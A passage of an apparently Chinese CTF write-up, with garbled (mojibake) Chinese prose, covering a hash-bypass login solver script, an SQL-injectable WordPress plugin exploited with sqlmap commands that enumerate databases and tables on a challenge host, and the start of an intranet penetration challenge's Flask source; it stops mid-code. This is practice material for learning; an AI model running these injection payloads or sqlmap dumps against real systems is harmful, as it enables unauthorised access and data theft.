punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"Invalid username or password"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">assert users[&quot;admin&quot;] &#x3D;&#x3D; &quot;admin&quot;usersä¸­å­˜åœ¨ç”¨æˆ·åâ€œadminâ€å¯†ç ä¹Ÿä¸ºâ€œadminâ€ï¼Œè¡¨é¢ä¸Šçœ‹éœ€è¦ä¼ å…¥çš„å‚æ•°ä¹Ÿä¸ºadmin&#x2F;adminã€‚</code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907210222817.png" alt="image-20230907210222817" loading="lazy"></p><p>ç»§ç»­åˆ†ææºç å¯ä»¥å‘ç°eval()è¯­å¥å°†base64.b64encodeè¦†å†™ä¸ºbase64.b64decode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment">#å½“ä¼ å…¥çš„å‚æ•°itemsä¸º2ä¸ªæ—¶è¯¥å‡½æ•°ç­‰ä»·äºæ±‚ä¸¤ä¸ªå‚æ•°çš„å¼‚æˆ–å€¼å¹¶è¿”å›ï¼Œæ‰€ä»¥å½“ä¸¤ä¸ªå‚æ•°ç›¸ç­‰æ—¶ä¸ç®¡è¯¥å‚æ•°ä¸ºä½•å€¼ï¼Œè¿”å›å€¼éƒ½ä¸º0</span><span class="token comment">#è€Œä¼ å…¥å‚æ•°æœ‰ä¸¤ä¸ªè¿‡æ»¤ï¼Œusernameä¸èƒ½ç­‰äºâ€œadminâ€ï¼Œä¸”usernameä¸èƒ½ç­‰äºpasswordï¼Œè€Œæ‹¿åˆ°flagéœ€è¦hashedå€¼ä¸º0ï¼Œæ€ä¹ˆæ‰èƒ½åšåˆ°å‘¢ï¼Ÿ</span></code></pre><p><strong>è€Œä¼ å…¥å‚æ•°æœ‰ä¸¤ä¸ªè¿‡æ»¤ï¼Œusernameä¸èƒ½ç­‰äºâ€œadminâ€ï¼Œä¸”usernameä¸èƒ½ç­‰äºpasswordï¼Œè€Œæ‹¿åˆ°flagéœ€è¦hashedå€¼ä¸º0ï¼Œæ€ä¹ˆæ‰èƒ½åšåˆ°å‘¢ï¼Ÿ</strong></p><p>æ¥ä¸‹æ¥ç¼–å†™è„šæœ¬å³å¯æŠŠæ„é€ çš„jsonæ•°æ®base64ç¼–ç äº”æ¬¡</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url <span class="token operator">=</span> <span class="token string">"http://localhost:64817/login"</span>username <span class="token operator">=</span> <span class="token string">"\"1\""</span>password <span class="token operator">=</span> <span class="token string">"1"</span>jsondata <span class="token operator">=</span> <span class="token string">"&#123;\"username\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">",\"password\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    jsondata <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token string">"&#123;\"params\":\""</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><h1 id="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"><a href="#å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·" class="headerlink" title="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"></a>å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·</h1><p>CHALLENGE: å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·<br>DESCRIPTION: æ¬¢è¿æ¥åˆ°å¿ƒæµ·æ–°å»ºçš„åšå®¢ï¼æ­£å€¼å‡æœŸæœŸé—´ï¼Œå¥¹æŠ“ç´§æ—¶é—´å‡ºå»æ—…æ¸¸æ”¾æ¾ä¸€ä¸‹ï¼Œçœ‹çœ‹å¥¹æœ€è¿‘éƒ½åœ¨ç ”ç©¶ä»€ä¹ˆï¼Ÿ<br><a href="http://101.42.178.83:7770/">http://101.42.178.83:7770/</a></p><p>æŸ¥çœ‹æºç é¡µé¢å¯å‘ç°ä¸€ä¸ªphpæ–‡ä»¶é“¾æ¥</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922215913893.png" alt="image-20230922215913893" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*Plugin Name: Visitor auto recorderDescription: Automatically record visitor's identification, still in development, do not use in industry environment!Author: KoKoMi  Still in development! :)*/</span><span class="token comment">// ä¸è®¸å·çœ‹ï¼è¿™äº›ä»£ç æˆ‘è¿˜åœ¨è°ƒè¯•å‘¢ï¼</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åŠ è½½æ•°æ®åº“é…ç½®ï¼Œæš‚æ—¶ç”¨ç¡¬ç¼–ç ç»å¯¹è·¯å¾„</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/wordpress/'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db_user</span> <span class="token operator">=</span> <span class="token constant">DB_USER</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“ç”¨æˆ·å</span><span class="token variable">$db_password</span> <span class="token operator">=</span> <span class="token constant">DB_PASSWORD</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“å¯†ç </span><span class="token variable">$db_name</span> <span class="token operator">=</span> <span class="token constant">DB_NAME</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“åç§°</span><span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token constant">DB_HOST</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“ä¸»æœº</span><span class="token comment">// æˆ‘è®°å¾—å¯ä»¥ç”¨wpæä¾›çš„global $wpdbæ¥æ“ä½œæ•°æ®åº“ï¼Œç­‰æ—…æ¸¸å›æ¥å†ç ”ç©¶ä¸€ä¸‹</span><span class="token comment">// è¿™äº›æ˜¯ä¸´æ—¶çš„ä»£ç </span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">,</span> <span class="token variable">$db_user</span><span class="token punctuation">,</span> <span class="token variable">$db_password</span><span class="token punctuation">,</span> <span class="token variable">$db_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ£€æŸ¥è¿æ¥æ˜¯å¦æˆåŠŸ</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ•°æ®åº“è¿æ¥å¤±è´¥: '</span> <span class="token operator">.</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('<span class="token interpolation"><span class="token variable">$ip</span></span>', '<span class="token interpolation"><span class="token variable">$user_agent</span></span>', <span class="token interpolation"><span class="token variable">$time</span></span>)"</span><span class="token punctuation">;</span><span class="token comment">// æ‰§è¡Œæ’å…¥</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ£€æŸ¥æ’å…¥æ˜¯å¦æˆåŠŸ</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ•°æ®æ’å…¥æˆåŠŸ'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ•°æ®æ’å…¥å¤±è´¥: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// å…³é—­æ•°æ®åº“è¿æ¥</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//gptçœŸå¥½ç”¨</span></span></code></pre><p>æ ¹æ®æµ‹è¯•å‘ç°timeå­˜åœ¨æŠ¥é”™æ³¨å…¥</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922220234166.png" alt="image-20230922220234166" loading="lazy"></p><p>sqlmapä¸€æŠŠæ¢­</p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py  <span class="token parameter variable">-u</span> <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token parameter variable">--data</span> <span class="token string">"time=1"</span>  <span class="token parameter variable">--dbs</span>  <span class="token parameter variable">--batch</span>python3 sqlmap.py  <span class="token parameter variable">-u</span> <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token parameter variable">--data</span> <span class="token string">"time=1"</span>  <span class="token parameter variable">-D</span> wordpress <span class="token parameter variable">--tables</span> <span class="token parameter variable">--batch</span>python3 sqlmap.py  <span class="token parameter variable">-u</span> <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token parameter variable">--data</span> <span class="token string">"time=1"</span>  <span class="token parameter variable">-D</span> wordpress  <span class="token parameter variable">-T</span> secret_of_kokomi <span class="token parameter variable">--columns</span> <span class="token parameter variable">--batch</span></code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222050154.png" alt="image-20230922222050154" loading="lazy"></p><h1 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h1><p>CHALLENGE: moeworld<br>DESCRIPTION: ä½ å·²ç»å­¦ä¼šäº†1+1&#x3D;2ï¼Œæ¥ä¸‹æ¥å°è¯•çœŸå®çš„æ¸—é€å§~<br>è§£å‹å¯†ç ä¸ºâ€œå‡ºå»æ—…æ¸¸çš„å¿ƒæµ·â€çš„flag</p><p>ä¸‹è½½é™„ä»¶è§£å‹å¾—åˆ°å¦‚ä¸‹æ–‡ä»¶</p><pre class="language-none"><code class="language-none">æœ¬é¢˜ä½ å°†æ‰®æ¼”**çº¢é˜Ÿ**çš„èº«ä»½ï¼Œä»¥è¯¥å¤–ç½‘ipå…¥æ‰‹ï¼Œå¹¶è¿›è¡Œå†…ç½‘æ¸—é€ï¼Œæœ€ç»ˆè·å–åˆ°å®Œæ•´çš„flagé¢˜ç›®ç¯å¢ƒï¼šhttp:&#x2F;&#x2F;47.115.201.35:8000&#x2F;åœ¨æœ¬æ¬¡å…¬å…±ç¯å¢ƒä¸­æ¸—é€æµ‹è¯•ä¸­ï¼Œå¸Œæœ›ä½ **ä¸è¦åšä¸è·å–flagæ— å…³çš„è¡Œä¸ºï¼Œä¸è¦åˆ é™¤æˆ–ç¯¡æ”¹flagï¼Œä¸è¦ç ´åé¢˜ç›®ç¯å¢ƒï¼Œä¸è¦æ³„éœ²é¢˜ç›®ç¯å¢ƒï¼****æ³¨å†Œæ—¶è¯·ä¸è¦ä½¿ç”¨ä½ å¸¸ç”¨çš„å¯†ç ï¼Œæœ¬ç¯å¢ƒå¯†ç åœ¨åå°ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨**hint.zip å¯†ç è¯·åœ¨æ‹¿åˆ°å¤–ç½‘é¶æœºåè®¿é—®æ ¹ç›®å½•ä¸‹çš„**readme**ï¼Œå®Œæˆæ¡ä»¶åè·å–ç¯å¢ƒå‡ºç°é—®é¢˜ï¼Œè¯·ç¬¬ä¸€æ—¶é—´è”ç³»å‡ºé¢˜äºº**xlccccc**å¯¹é¢˜ç›®æœ‰ç–‘é—®ï¼Œä¹Ÿå¯éšæ—¶è¯¢é—®å‡ºé¢˜äºº</code></pre><p>æ ¹æ®é¢˜ç›®æ¥è¯´çœ‹æ¥éœ€è¦å†…ç½‘é¨æ¸¸äº†</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222659454.png" alt="image-20230922222659454" loading="lazy"></p><p>ä¸€ä¸ªpythonæ­å»ºçš„ç½‘é¡µè¿™æ˜¯è¯¥ç½‘ç«™æºç </p><p><strong>app.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> curses <span class="token keyword">import</span> flash<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token keyword">import</span> os<span class="token keyword">import</span> dataSql<span class="token keyword">import</span> datetime<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>template_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"static/templates"</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>static_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"static"</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"This-random-secretKey-you-can't-get"</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> dataSql<span class="token punctuation">.</span>canLogin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username            session<span class="token punctuation">[</span><span class="token string">'power'</span><span class="token punctuation">]</span> <span class="token operator">=</span> dataSql<span class="token punctuation">.</span>getPower<span class="token punctuation">(</span>username<span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"username or password incorrect"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("You have already logged in.");window.location.href="/index";&lt;/script>'''</span><span class="token comment"># change the password</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">foundpwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'changepwd.html'</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>    oldPassword <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'oldPassword'</span><span class="token punctuation">]</span>    newPassword <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'newPassword'</span><span class="token punctuation">]</span>    a <span class="token operator">=</span> dataSql<span class="token punctuation">.</span>changePassword<span class="token punctuation">(</span>username<span class="token punctuation">,</span> oldPassword<span class="token punctuation">,</span> newPassword<span class="token punctuation">)</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''    change successfully    &lt;br>    &lt;a href='login'>login now&lt;/a>    '''</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span>a<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'change'</span><span class="token punctuation">)</span><span class="token comment"># register for enter the message board</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>    <span class="token builtin">id</span> <span class="token operator">=</span> dataSql<span class="token punctuation">.</span>usersName<span class="token punctuation">(</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>    power <span class="token operator">=</span> <span class="token string">'guest'</span>    <span class="token keyword">if</span> dataSql<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> power<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''    register successfully    &lt;br>    &lt;a href='login'>login now&lt;/a>    '''</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'username already exists'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''    you are not logged in    &lt;br>    &lt;a href='login'>login now&lt;/a>    '''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>            msg <span class="token operator">=</span> getMsgList<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'power'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'guest'</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> msg<span class="token punctuation">:</span>                    <span class="token comment"># remove the message send by other user on private condition</span>                    <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                        msg<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            message <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span>            username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>            nowtime <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'private'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span 